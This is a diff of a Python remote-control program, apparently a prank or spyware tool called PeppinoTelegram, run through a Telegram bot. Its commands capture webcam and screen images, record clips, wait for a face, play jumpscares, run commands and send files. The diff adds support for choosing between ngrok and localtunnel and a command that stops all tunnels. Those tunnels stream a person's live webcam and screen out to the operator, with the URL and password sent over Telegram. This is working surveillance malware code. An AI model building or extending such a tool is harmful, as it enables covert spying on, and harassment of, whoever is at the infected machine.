@@ -151,7 +151,7 @@ def checkconn() -> bool:
 def getCred(filename:str=resource_path("auth.json")) -> tuple[str,int]:
     with open(filename) as fi:
         var = json.load(fi)
-    return var["token"],var["chatid"],var["ngrok_token"]
+    return var["token"],var["chatid"],var["ngrok_token"],var["tunnel_provider"]
         
 #Resizing assets so they all take the same time to load when doing jumpscares(I guess)
 def compress_and_resize_image(image_array, target_size=(1920, 1080), quality=30) -> np.array:
@@ -309,13 +309,13 @@ o888o  o888o  `Y8bood8P'  o888o        `Y8bod8P'  888bod8P'
                                                  o888o
 """
 class PeppinoTelegram:
-    def __init__(self, token: str, owner_id: int, ngrok_token: str, mixer: CustomMixer, capture: VideoCapture, loading_bar_set: list[str]=["🟩","🟥"], loading_bar_spinner: list[str]=[all_spinners["braille"]], signal_error: str|None = None) -> None:
+    def __init__(self, token: str, owner_id: int, ngrok_token: str, mixer: CustomMixer, capture: VideoCapture, loading_bar_set: list[str]=["🟩","🟥"], loading_bar_spinner: list[str]=[all_spinners["braille"]], signal_error: str|None = None, tunnel_provider: str="ngrok") -> None:
         self.token = token
         self.owner_id = owner_id
         self.ngrok_token = ngrok_token
         self.can_use_ngrok = bool(ngrok_token)
-        if self.can_use_ngrok:
-            self.tunnelhandler = TunnelManager()
+        self.tunnelhandler = TunnelManager(tunnel_provider)
+        self.tunnel_provider = tunnel_provider
 
         if signal_error:
             self.bsend(signal_error)
@@ -407,6 +407,7 @@ class PeppinoTelegram:
             "screenstreamstop": self.stop_screen_tunnel,
             "webcamandscreenstreamstart": self.start_webcam_and_screen_tunnel,
             "webcamandscreenstreamstop": self.stop_webcam_and_screen_tunnel,
+            "stop_all_tunnels":self.stop_all_tunnels,
             "camerawallpaper": self.setCameraAsWallpaper,
             "setvideowallpaper": self.setvideowallpaper,
 
@@ -561,6 +562,10 @@ class PeppinoTelegram:
             raise ConnectionError
         except Exception as e:
             return self.bsend(text, retries+1)
+    
+    def bsendWithMarkdownV2(self, text: str, retries=0, reply_markup=None) -> int|None:
+        self.bsend(text, retries, parse_mode="MarkDownV2", reply_markup=reply_markup)
+
 
     def download_file(self, path: str) -> None:
         self.bsend(f"📤 Sending file: {path}")
@@ -838,7 +843,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         self.modded_screenshot(invert_image)
 
     def getip(self):
-        output = self.execute("curl ifconfig.co", return_output=True)
+        output = get_public_ip()
         self.bsend(f"🌐 Public IP: {output}")
 
     def johnpork(self, audio=True) -> None:
@@ -1085,20 +1090,21 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def menu_camera(self):
         buttons = {
             "🔙 Back": "/mainmenu",
-            "🤳 Selfie": "/selfie",
-            "📸 Screenshot": "/screenshot",
-            "🎞️ Fullclip": "/fullclip",
-            "🎥 Webcamclip": "/webcamclip",
-            "🖥️ Screenclip": "/screenclip",
-            "🎙️ Recordjum": "/recordjum",
-            "⏳ Waitforface": "/waitforface",
-            "🖼️ Displaymode": "/displaymode",
-            "📷🟢 Webcamstreamstart": "/webcamstreamstart",
-            "🖥️🟢 Screenstreamstart": "/screenstreamstart",
-            "📷🔴 Webcamstreamstop": "/webcamstreamstop",
-            "🖥️🔴 Screenstreamstop": "/screenstreamstop",
-            "📷🖥️🟢 Webcamandscreenstreamstart": "/webcamandscreenstreamstart",
-            "📷🖥️🔴 Webcamandscreenstreamstop": "/webcamandscreenstreamstop",
+            "🤳 Webcam Snapshot": "/selfie",
+            "🖼️ Take Screenshot": "/screenshot",
+            "🎞️ Record Full Clip": "/fullclip",
+            "🎥 Record Webcam": "/webcamclip",
+            "🖥️ Record Screen": "/screenclip",
+            "🎙️ Record Audio Jump": "/recordjum",
+            "⏳ Waiting for Face": "/waitforface",
+            "🖼️ Display Options": "/displaymode",
+            "📹🟢 Start Webcam Stream": "/webcamstreamstart",
+            "🖥️🟢 Start Screen Stream": "/screenstreamstart",
+            "📹🔴 Stop Webcam Stream": "/webcamstreamstop",
+            "🖥️🔴 Stop Screen Stream": "/screenstreamstop",
+            "📹🖥️🟢 Start Webcam & Screen Stream": "/webcamandscreenstreamstart",
+            "📹🖥️🔴 Stop Webcam & Screen Stream": "/webcamandscreenstreamstop",
+            "❌🔴 Stop All Streams":"/stop_all_tunnels",
         }
 
         if self.mainmenu_ref:
@@ -2132,63 +2138,112 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             sp_win = Thread(target=self.message_box, args=["Warning", text,])
             sp_win.start()
     
-    def stop_webcam_and_screen_tunnel(self) -> None:
+    def stop_webcam_and_screen_tunnel(self, verbose=True) -> None:
         if self.webcam_and_screen_url:
             self.tunnelhandler.stop_service("webcamandscreen")
             self.webcam_and_screen_url = None
-            self.bsend(f"{emoji_dict['photo']}{emoji_dict['screen']} Webcam&Screen tunnel closed")
-        else:
-            self.bsend(f"{emoji_dict['photo']}{emoji_dict['screen']} You have no screen tunnel opened")
-    
-    def stop_webcam_tunnel(self) -> None:
+            if verbose:
+                self.bsend(f"📸🖥️ Webcam & Screen tunnel closed")
+            return
+        if verbose:
+            self.bsend(f"📸🖥️ You have no Webcam & Screen tunnel opened")
+
+    def stop_webcam_tunnel(self, verbose=True) -> None:
         if self.webcam_url:
             self.closecap()
             self.tunnelhandler.stop_service("webcam")
             self.webcam_url = None
-            self.bsend(f"{emoji_dict['photo']} Webcam tunnel closed")
-        else:
-            self.bsend(f"{emoji_dict['photo']} You have no webcam tunnel opened")
+            if verbose:
+                self.bsend(f"📸 Webcam tunnel closed")
+            return
+        if verbose:
+            self.bsend(f"📸 You have no Webcam tunnel opened")
 
-    def stop_screen_tunnel(self) -> None:
+    def stop_screen_tunnel(self, verbose=True) -> None:
         if self.screen_url:
             self.tunnelhandler.stop_service("screen")
             self.screen_url = None
-            self.bsend(f"{emoji_dict['screen']} Screen tunnel closed")
-        else:
-            self.bsend(f"{emoji_dict['screen']} You have no screen tunnel opened")
+            if verbose:
+                self.bsend(f"🖥️ Screen tunnel closed")
+            return
+        if verbose:
+            self.bsend(f"🖥️ You have no Screen tunnel opened")
+
+    def stop_all_tunnels(self) -> None:
+        e = self.new_editable_message("Closing all tunnels..")
+        self.stop_screen_tunnel(False)
+        self.stop_webcam_and_screen_tunnel(False)
+        self.stop_webcam_tunnel(False)
+        e.edit("Done.")
+        e.delete()
 
     def start_webcam_and_screen_tunnel(self) -> None:
-        if self.can_use_ngrok and self.webcam_and_screen_url is None:
-            self.webcam_and_screen_url = self.tunnelhandler.start_webcam_and_screen_stream(cap=self.cap)
-            self.bsend(f"{emoji_dict['photo']}{emoji_dict['screen']} Webcam&Screen Tunnel url: {self.webcam_and_screen_url}")
-
-        elif self.can_use_ngrok and not(self.webcam_and_screen_url is None):
-            self.bsend(f"{emoji_dict['photo']}{emoji_dict['screen']} Webcam&Screen Tunnel url: {self.webcam_and_screen_url}")
-
+        self.stop_all_tunnels()
+        if self.can_use_ngrok or self.tunnel_provider == "localtunnel":
+            if self.webcam_and_screen_url is None:
+                self.webcam_and_screen_url, password = self.tunnelhandler.start_webcam_and_screen_stream(
+                    cap=self.cap
+                )
+                warning = generate_warning_for_url(self.webcam_and_screen_url)
+                url_md = escape_md(self.webcam_and_screen_url)
+                self.bsendWithMarkdownV2(
+                    f"📸🖥️ *Webcam & Screen Tunnel Started*\n"
+                    f"URL: [{url_md}]({url_md})\n"
+                    f"Password: `{password}`\n"
+                    f"Warning: `{warning}`"
+                )
+            else:
+                url_md = escape_md(self.webcam_and_screen_url)
+                self.bsendWithMarkdownV2(
+                    f"📸🖥️ *Webcam & Screen Tunnel Already Running*\n"
+                    f"URL: [{url_md}]({url_md})"
+                )
         else:
-            self.bsend("You cant use tunnel because you didn't provide a ngrok token.")
+            self.bsendWithMarkdownV2("⚠️ You cannot start the tunnel because no ngrok token was provided.")
 
     def start_webcam_tunnel(self) -> None:
-        if self.can_use_ngrok and self.webcam_url is None:
-            self.webcam_url = self.tunnelhandler.start_webcam_stream(cap=self.cap)
-            self.bsend(f"{emoji_dict['photo']} Webcam Tunnel url: {self.webcam_url}")
-
-        elif self.can_use_ngrok and not(self.webcam_url is None):
-            self.bsend(f"{emoji_dict['photo']} Webcam Tunnel url: {self.webcam_url}")
-
+        self.stop_all_tunnels()
+        if self.can_use_ngrok or self.tunnel_provider == "localtunnel":
+            if self.webcam_url is None:
+                self.webcam_url, password = self.tunnelhandler.start_webcam_stream(cap=self.cap)
+                warning = generate_warning_for_url(self.webcam_url)
+                url_md = escape_md(self.webcam_url)
+                self.bsendWithMarkdownV2(
+                    f"📸 *Webcam Tunnel Started*\n"
+                    f"URL: [{url_md}]({url_md})\n"
+                    f"Password: `{password}`\n"
+                    f"Warning: `{warning}`"
+                )
+            else:
+                url_md = escape_md(self.webcam_url)
+                self.bsendWithMarkdownV2(
+                    f"📸 *Webcam Tunnel Already Running*\n"
+                    f"URL: [{url_md}]({url_md})"
+                )
         else:
-            self.bsend("You cant use tunnel because you didn't provide a ngrok token.")
+            self.bsendWithMarkdownV2("⚠️ You cannot start the tunnel because no ngrok token was provided.")
 
     def start_screen_tunnel(self) -> None:
-        if self.can_use_ngrok and self.screen_url is None:
-            self.screen_url = self.tunnelhandler.start_screen_stream()
-            self.bsend(f"{emoji_dict['screen']} Screen Tunnel url: {self.screen_url}")
-
-        elif self.can_use_ngrok and not (self.screen_url is None):
-            self.bsend(f"{emoji_dict['screen']} Screen Tunnel url: {self.screen_url}")
-
+        self.stop_all_tunnels()
+        if self.can_use_ngrok or self.tunnel_provider == "localtunnel":
+            if self.screen_url is None:
+                self.screen_url, password = self.tunnelhandler.start_screen_stream()
+                warning = generate_warning_for_url(self.screen_url)
+                url_md = escape_md(self.screen_url)
+                self.bsendWithMarkdownV2(
+                    f"🖥️ *Screen Tunnel Started*\n"
+                    f"URL: [{url_md}]({url_md})\n"
+                    f"Password: `{password}`\n"
+                    f"Warning: `{warning}`"
+                )
+            else:
+                url_md = escape_md(self.screen_url)
+                self.bsendWithMarkdownV2(
+                    f"🖥️ *Screen Tunnel Already Running*\n"
+                    f"URL: [{url_md}]({url_md})"
+                )
         else:
-            self.bsend("You cant use tunnel because you didn't provide a ngrok token.")
+            self.bsendWithMarkdownV2("⚠️ You cannot start the tunnel because no ngrok token was provided.")
 
     def send_prompt(self, question: str) -> str:
         self.bsend(question)
@@ -2266,8 +2321,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             self.running = False
             self.clear()
             self.bsend("🛑 Interrupted by you, bye bye.")
-            self.stop_screen_tunnel()
-            self.stop_webcam_tunnel()
+            self.stop_all_tunnels()
             sys.exit()
         else:
             self.bsend("Operation stopped.")
@@ -2335,7 +2389,7 @@ o8o        o888o `Y888""8o o888o o888o o888o
 
 if __name__ == "__main__":
     try:
-        token, chat_id, ngrok_token = getCred() 
+        token, chat_id, ngrok_token, tunnel_provider = getCred() 
     except Exception as e:
         with open(join(gettempdir(), "PEP2log.log"), "w") as fo:
             fo.write(traceback.format_exc())
@@ -2343,20 +2397,22 @@ if __name__ == "__main__":
     mixer = CustomMixer()
     capture = VideoCapture(0)
     signal_error = ""
-    try:
-        pyngrok.process.subprocess.Popen = _patched_popen
+    if tunnel_provider == "ngrok":
         try:
-            if ngrok_token.strip():
-                terminate_process_by_name("ngrok.exe")
-                ngrok.set_auth_token(ngrok_token)
-                close_all_tunnels(ngrok)
-        except pyngrok.exception.PyngrokNgrokError as e:
-                sleep(2)
-                terminate_process_by_name("ngrok.exe")
-                signal_error += f"Ngrok Error: {e}\n"
-                ngrok_token = None
-    except Exception as e:
-        signal_error += f"Unhandled exception: {e}"
-    pep2 = PeppinoTelegram(token,chat_id,ngrok_token,mixer,capture,loading_bar_set=[emoji_dict["progress"],emoji_dict["empty_progress"]],loading_bar_spinner=all_spinners["circle_dots"])
+            pyngrok.process.subprocess.Popen = _patched_popen
+            try:
+                if ngrok_token.strip():
+                    terminate_process_by_name("ngrok.exe")
+                    ngrok.set_auth_token(ngrok_token)
+                    close_all_tunnels(ngrok)
+            except pyngrok.exception.PyngrokNgrokError as e:
+                    sleep(2)
+                    terminate_process_by_name("ngrok.exe")
+                    signal_error += f"Ngrok Error: {e}\n"
+                    ngrok_token = None
+        except Exception as e:
+            signal_error += f"Unhandled exception: {e}\n"
+
+    pep2 = PeppinoTelegram(token,chat_id,ngrok_token,mixer,capture,loading_bar_set=[emoji_dict["progress"],emoji_dict["empty_progress"]],loading_bar_spinner=all_spinners["circle_dots"], tunnel_provider="ngrok" if ngrok_token and tunnel_provider=="ngrok" else "localtunnel")
     # I wanted to make this multiple user but the code has become too hard to maintain.
     pep2.start()
